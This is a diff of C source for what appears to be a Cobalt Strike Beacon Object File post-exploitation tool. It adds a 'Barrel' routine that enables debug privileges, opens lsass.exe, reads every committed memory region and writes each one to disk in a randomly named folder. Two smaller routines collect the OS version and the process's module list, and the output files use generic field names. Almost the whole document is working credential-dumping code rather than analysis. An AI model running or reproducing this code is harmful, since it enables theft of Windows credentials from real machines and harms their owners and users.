@@ -5,7 +5,10 @@
 #define MAX_MODULES 1024
 #define MAX_NAME_LENGTH 256
 #define JSON_BUFFER_SIZE 5096
+#define ALPHANUM "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+#define ALPHANUM_SIZE (sizeof(ALPHANUM) - 1)
 
+// Structs
 typedef struct {
     char base_dll_name[MAX_PATH];   // Base DLL name
     char full_dll_path[MAX_PATH];   // Full DLL path
@@ -13,7 +16,29 @@ typedef struct {
     int size;
 } ModuleInformation;
 
-// Define the NTSTATUS function signatures
+typedef struct {
+    char filename[20];
+    unsigned char* content;
+    void* address;
+    size_t size;
+} MemFile;
+
+typedef struct _TOKEN_PRIVILEGES_STRUCT {
+    DWORD PrivilegeCount;
+    LUID Luid;
+    DWORD Attributes;
+} TOKEN_PRIVILEGES_STRUCT;
+
+typedef struct _PROCESS_BASIC_INFORMATION {
+    PVOID Reserved1;            // This is reserved for internal use
+    PVOID PebBaseAddress;       // Base address of the process's PEB (Process Environment Block)
+    PVOID Reserved2[2];         // Reserved for internal use
+    ULONG_PTR UniqueProcessId;  // The process ID
+    PVOID Reserved3;            // Reserved for internal use
+} PROCESS_BASIC_INFORMATION;
+
+// Function definitions
+DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlGetVersion(POSVERSIONINFOW);
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtOpenProcessToken(HANDLE, DWORD, PHANDLE);
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtAdjustPrivilegesToken(HANDLE, BOOLEAN, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
 DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtClose(HANDLE);
@@ -31,25 +56,13 @@ DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, 
 DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
+DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$SystemFunction036(PVOID, ULONG);
+DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateDirectoryA(LPCSTR, LPSECURITY_ATTRIBUTES);
 
+// Constants
 const int zero_memory = 0x00000008;
 const int max_string_length = 1024;
 
-// Structure for TOKEN_PRIVILEGES
-typedef struct _TOKEN_PRIVILEGES_STRUCT {
-    DWORD PrivilegeCount;
-    LUID Luid;
-    DWORD Attributes;
-} TOKEN_PRIVILEGES_STRUCT;
-
-
-typedef struct _PROCESS_BASIC_INFORMATION {
-    PVOID Reserved1;            // This is reserved for internal use
-    PVOID PebBaseAddress;       // Base address of the process's PEB (Process Environment Block)
-    PVOID Reserved2[2];         // Reserved for internal use
-    ULONG_PTR UniqueProcessId;  // The process ID
-    PVOID Reserved3;            // Reserved for internal use
-} PROCESS_BASIC_INFORMATION;
 
 
 PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address) {
@@ -370,6 +383,7 @@ int MyStrCmp(const char* s1, const char* s2) {
 }
 
 
+/*
 void MyIntToHexStr(long long value, char* buffer) {
     int i;
     // We need exactly 12 hex digits for "7FFD572D0000"
@@ -387,6 +401,28 @@ void MyIntToHexStr(long long value, char* buffer) {
     }
 
     buffer[12] = '\0';  // Null-terminate the string
+}
+*/
+
+
+void MyIntToHexStr(long long value, char* buffer) {
+    int i;
+
+    // Start filling the buffer from index 15, leaving space for 16 hex characters
+    for (i = 15; i >= 0; i--) {
+        int nibble = value & 0xF;  // Get the last 4 bits (1 nibble)
+
+        // Convert the nibble to a hex character
+        if (nibble < 10) {
+            buffer[i] = '0' + nibble;
+        } else {
+            buffer[i] = 'A' + (nibble - 10);
+        }
+
+        value >>= 4;  // Shift right by 4 bits to process the next nibble
+    }
+
+    buffer[16] = '\0';  // Null-terminate the string
 }
 
 
@@ -540,7 +576,227 @@ void replace_backslash(const char* str, char* result, int result_size){
 }
 
 
-char* get_json(ModuleInformation* module_list, int module_counter){
+void write_string_to_file(char* file_path, char* data, int data_len, BOOLEAN debug) {
+    // CreateFile
+    HANDLE hFile = KERNEL32$CreateFileA(
+        file_path,                // File path
+        GENERIC_WRITE,            // Open for writing
+        0,                        // Do not share
+        NULL,                     // Default security
+        CREATE_ALWAYS,            // Overwrite the file if it exists
+        FILE_ATTRIBUTE_NORMAL,    // Normal file attributes
+        NULL                      // No template file
+    );
+    if (hFile == INVALID_HANDLE_VALUE) {
+        BeaconPrintf(CALLBACK_ERROR, "Failed to create file: %s\n", file_path);
+        return;
+    }
+
+    // WriteFile
+    // int data_len = MyStrLen(data);
+    DWORD bytesWritten;
+    BOOL result = KERNEL32$WriteFile(
+        hFile,                    // Handle to the file
+        data,                     // Pointer to the data to write
+        data_len,           // Length of the data (in bytes)
+        &bytesWritten,            // Number of bytes written
+        NULL                      // Overlapped not used
+    );
+    if (!result) {
+        BeaconPrintf(CALLBACK_ERROR, "Failed to write to file: %s\n", file_path);
+    } else {
+        if(debug){
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] File %s generated (%d bytes).\n", file_path, bytesWritten);
+        }
+    }
+
+    // Close handle
+    KERNEL32$CloseHandle(hFile);
+}
+
+
+void generate_random_string(char* buffer, int length) {
+    ADVAPI32$SystemFunction036(buffer, length);
+    static char charset[] = ALPHANUM;
+    
+    HANDLE hHeap = KERNEL32$GetProcessHeap();
+    char* random_bytes = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, length * sizeof(BYTE));
+    
+    if (!ADVAPI32$SystemFunction036(random_bytes, length)) {
+        BeaconPrintf(CALLBACK_ERROR, "Failed to generate random bytes.");
+        KERNEL32$HeapFree(hHeap, 0, buffer);
+        KERNEL32$HeapFree(hHeap, 0, random_bytes);
+        return;
+    }
+
+    // Map random bytes to alphanumeric characters
+    for (int i = 0; i < length; i++) {
+        buffer[i] = charset[random_bytes[i] % ALPHANUM_SIZE];
+    }
+    buffer[length] = '\0';  // Null-terminate the string
+
+    // Free the random bytes buffer
+    KERNEL32$HeapFree(hHeap, 0, random_bytes);
+}
+
+
+void generate_fixed_string_with_dot(char* buffer) {
+    generate_random_string(buffer, 10);
+    buffer[10] = '.';
+    generate_random_string(buffer + 11, 3);
+    buffer[14] = '\0';
+}
+
+
+char* get_json_barrel(MemFile* memfile_list, int memfile_count){
+    HANDLE hHeap = KERNEL32$GetProcessHeap();
+    char *buffer = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 5096);
+    if (buffer == NULL) {
+        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed\n");
+        return;
+    }
+
+    char* json_output = "[";
+    for (int i = 0; i < memfile_count; i++) {
+        if(i != 0){
+            json_output = concatenate_strings(json_output, ", ");    
+        }
+        char* base_buffer[17];
+        MyIntToHexStr((long long) memfile_list[i].address, base_buffer);
+        // BeaconPrintf(CALLBACK_OUTPUT, "%s\n", base_buffer);
+        char* size_buffer[12];
+        MyIntToStr(memfile_list[i].size, size_buffer);
+
+        char* buffer_name[17];
+        MyIntToHexStr((long long) memfile_list[i].address, buffer_name);
+        //MyStrcpy(memFile.filename, buffer_name, 17);
+
+        // char* json_part_1 = create_string_with_var("{\"field0\":\"", memfile_list[i].filename, "\",");
+        char* json_part_1 = create_string_with_var("{\"field0\":\"", buffer_name, "\",");
+        // BeaconPrintf(CALLBACK_OUTPUT, "%s\n", json_part_1);
+        // char* json_part_2 = create_string_with_var("\"field1\": \"", memfile_list[i].full_dll_path, "\", ");
+        // char* json_part_2 = create_string_with_var("\"field1\":\"0x", base_buffer, "\",");
+        char* json_part_2 = create_string_with_var("\"field1\":\"0x", base_buffer, "\",");
+        char* json_part_3 = create_string_with_var("\"field2\":\"", size_buffer, "\"}");
+        char* json_entry = concatenate_strings(concatenate_strings(json_part_1, json_part_2), json_part_3);
+        json_output = concatenate_strings(json_output, json_entry);
+    }
+    json_output = concatenate_strings(json_output, "]");
+    // BeaconPrintf(CALLBACK_OUTPUT, "%s\n", json_output);
+    // KERNEL32$HeapFree(hHeap, 0, buffer);
+    return json_output;
+}
+
+
+void dump_files(MemFile* memfile_list, int memfile_count){
+    // Create folder
+    // char* barrel_folder_name = "barrel_output";
+    char* barrel_folder_name[10];
+    generate_random_string(barrel_folder_name, 10);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Created folder: \t\t%s\n", barrel_folder_name);
+    BOOL result;
+    // result = KERNEL32$RemoveDirectoryA(barrel_folder_name);
+    result = KERNEL32$CreateDirectoryA(barrel_folder_name, NULL);
+    for (int i = 0; i < memfile_count; i++) {
+        char* fname =concatenate_strings(concatenate_strings(barrel_folder_name, "\\"), memfile_list[i].filename);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Creating file %s (File %d)\n", fname, (i+1));
+        write_string_to_file(fname, memfile_list[i].content, memfile_list[i].size, FALSE);
+    }
+}
+
+
+void Barrel(){
+    char* filename = "barrel.json";
+    EnableDebugPrivileges();
+    HANDLE currentProcess = KERNEL32$GetCurrentProcess();
+    // BeaconPrintf(CALLBACK_OUTPUT, "[+] Current process handle:\t%d\n", currentProcess);
+    GetProcNameFromHandle(currentProcess);
+    HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process handle: \t\t%d\n", hProcess);
+    
+    long long proc_max_address_l = 0x7FFFFFFEFFFF;
+    PVOID mem_address = 0;
+    int aux_size = 0;
+    char aux_name[MAX_PATH] = "";
+     int memfile_count = 0;          // Track number of MemFiles
+    // MemFile memfile_list[1024];     // Fixed array for simplicity
+    HANDLE hHeap = KERNEL32$GetProcessHeap();  
+    MemFile* memfile_list = (MemFile*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(MemFile) * MAX_MODULES);
+
+    while ((long long)mem_address < proc_max_address_l) {
+        MEMORY_BASIC_INFORMATION mbi;
+        SIZE_T returnSize;
+
+        int memory_basic_information_size = sizeof(MEMORY_BASIC_INFORMATION);
+        PVOID mbi_addr = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, memory_basic_information_size);
+        if (mbi_addr == NULL) {
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for process information.\n");
+            return ;
+        }
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] MBI Addr: 0x%p.\n", mbi_addr);
+
+
+        // Populate MEMORY_BASIC_INFORMATION struct
+        NTSTATUS ntstatus = NTDLL$NtQueryVirtualMemory(hProcess, mem_address, 0, &mbi, sizeof(mbi), &returnSize);
+
+        // If readable and committed --> Get information
+        if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT) {
+            // Get random name
+            //BeaconPrintf(CALLBACK_OUTPUT, "[+] Mem Addr: 0x%p\tmbi.RegionSize: 0x%p\n", mem_address, mbi.RegionSize);
+            char random_name[15];
+            generate_fixed_string_with_dot(random_name);
+            // BeaconPrintf(CALLBACK_OUTPUT, "[+] fname: \t\t%s\n", random_name);
+
+            // Read bytes
+            SIZE_T regionSize = mbi.RegionSize;
+            // BeaconPrintf(CALLBACK_OUTPUT, "[+] regionSize: \t0x%p\n", regionSize);
+            PVOID buffer = KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, regionSize);
+            SIZE_T bytesRead = 0;     // Number of bytes actually read
+            NTSTATUS ntstatus = NTDLL$NtReadVirtualMemory(hProcess, mem_address, buffer, regionSize, &bytesRead);
+            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != NULL) {
+                BeaconPrintf(CALLBACK_OUTPUT, "NtReadVirtualMemory failed with status: 0x%p\n", ntstatus);
+            }
+            // BeaconPrintf(CALLBACK_OUTPUT, "bytesRead: %d\n", bytesRead);
+
+
+            // Add to MemFile array
+            MemFile memFile;
+            char* buffer_name[17];
+            MyIntToHexStr((long long) mem_address, buffer_name);
+            MyStrcpy(memFile.filename, buffer_name, 17);
+            // MyStrcpy(memFile.filename, random_name, 15);
+            
+            memFile.content = (unsigned char*) buffer;
+            // BeaconPrintf(CALLBACK_OUTPUT, "regionSize: \t%d\n", regionSize);
+            // memFile.content = (unsigned char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, regionSize);
+            // MyStrcpy((unsigned char*)memFile.content, buffer, regionSize);
+
+            //// BeaconPrintf(CALLBACK_OUTPUT, "[+] Address: 0x%14X\tName: %s\n", mem_address, random_name);
+            for (size_t i = 0; i < 16; i++) {
+                unsigned char* test = (unsigned char*) buffer;
+                ////// BeaconPrintf(CALLBACK_OUTPUT, "%02X ", test[i]);  // Print each byte in hexadecimal (02X ensures two digits with leading zero)
+            }
+            ///// BeaconPrintf(CALLBACK_OUTPUT, "\n");
+
+            memFile.size = mbi.RegionSize;
+            memFile.address = mem_address;
+            memfile_list[memfile_count++] = memFile;
+        }
+
+        // BeaconPrintf(CALLBACK_OUTPUT, "[+] mem_address: \t0x%p\n", mem_address);
+        mem_address = (PVOID)((ULONG_PTR)mem_address + mbi.RegionSize);
+        KERNEL32$HeapFree(hHeap, 0, mbi_addr);
+    }
+    
+    char* json_output = get_json_barrel(memfile_list, memfile_count);
+    int data_len = MyStrLen(json_output);
+    write_string_to_file(filename, json_output, data_len, TRUE);
+    // Create dump files
+    dump_files(memfile_list, memfile_count);
+}
+
+
+char* get_json_shock(ModuleInformation* module_list, int module_counter){
     HANDLE hHeap = KERNEL32$GetProcessHeap();
     char *buffer = (char*)KERNEL32$HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 5096);
     if (buffer == NULL) {
@@ -579,43 +835,6 @@ char* get_json(ModuleInformation* module_list, int module_counter){
     // BeaconPrintf(CALLBACK_OUTPUT, "%s\n", json_output);
     // KERNEL32$HeapFree(hHeap, 0, buffer);
     return json_output;
-}
-
-
-void write_string_to_file(char* file_path, char* data) {
-    // CreateFile
-    HANDLE hFile = KERNEL32$CreateFileA(
-        file_path,                // File path
-        GENERIC_WRITE,            // Open for writing
-        0,                        // Do not share
-        NULL,                     // Default security
-        CREATE_ALWAYS,            // Overwrite the file if it exists
-        FILE_ATTRIBUTE_NORMAL,    // Normal file attributes
-        NULL                      // No template file
-    );
-    if (hFile == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to create file: %s\n", file_path);
-        return;
-    }
-
-    // WriteFile
-    int data_len = MyStrLen(data);
-    DWORD bytesWritten;
-    BOOL result = KERNEL32$WriteFile(
-        hFile,                    // Handle to the file
-        data,                     // Pointer to the data to write
-        data_len,           // Length of the data (in bytes)
-        &bytesWritten,            // Number of bytes written
-        NULL                      // Overlapped not used
-    );
-    if (!result) {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to write to file: %s\n", file_path);
-    } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] File %s generated (%d bytes).\n", file_path, bytesWritten);
-    }
-
-    // Close handle
-    KERNEL32$CloseHandle(hFile);
 }
 
 
@@ -682,15 +901,39 @@ void Shock(){
         KERNEL32$HeapFree(hHeap, 0, mbi_addr);
     }
 
-    char* json_output = get_json(module_list, module_counter);
+    char* json_output = get_json_shock(module_list, module_counter);
     // BeaconPrintf(CALLBACK_OUTPUT, "%s\n", json_output);
-    write_string_to_file(filename, json_output);
-    
-    // Close handle
-    NTDLL$NtClose(hProcess);
+    int json_output_len = MyStrLen(json_output);
+    write_string_to_file(filename, json_output, json_output_len, TRUE);
+    sleep(0);
+}
+
+
+void Lock(){
+    char* filename = "lock.json";
+    OSVERSIONINFOW osvi;
+    NTSTATUS status = NTDLL$RtlGetVersion(&osvi);
+    if (status == 0) {
+        char* majorversion_buffer[12];
+        MyIntToStr(osvi.dwMajorVersion, majorversion_buffer);
+        char* minorversion_buffer[12];
+        MyIntToStr(osvi.dwMinorVersion, minorversion_buffer);
+        char* buildnumber_buffer[12];
+        MyIntToStr(osvi.dwBuildNumber, buildnumber_buffer);
+        char* json_part_1 = create_string_with_var("{ \"field0\": \"", majorversion_buffer, "\", ");
+        char* json_part_2 = create_string_with_var("\"field1\": \"", minorversion_buffer, "\", ");        
+        char* json_part_3 = create_string_with_var("\"field2\": \"", buildnumber_buffer, "\"}");
+        char* json_entry = concatenate_strings(concatenate_strings(json_part_1, json_part_2), json_part_3);
+        char* json_output = concatenate_strings(concatenate_strings("[", json_entry), "]");
+        //BeaconPrintf(CALLBACK_OUTPUT, "%s\n", json_output);
+        int json_output_len = MyStrLen(json_output);
+        write_string_to_file(filename, json_output, json_output_len, TRUE);
+    }
 }
 
 
 void go() {
+    Lock();
     Shock();
+    Barrel();
 }
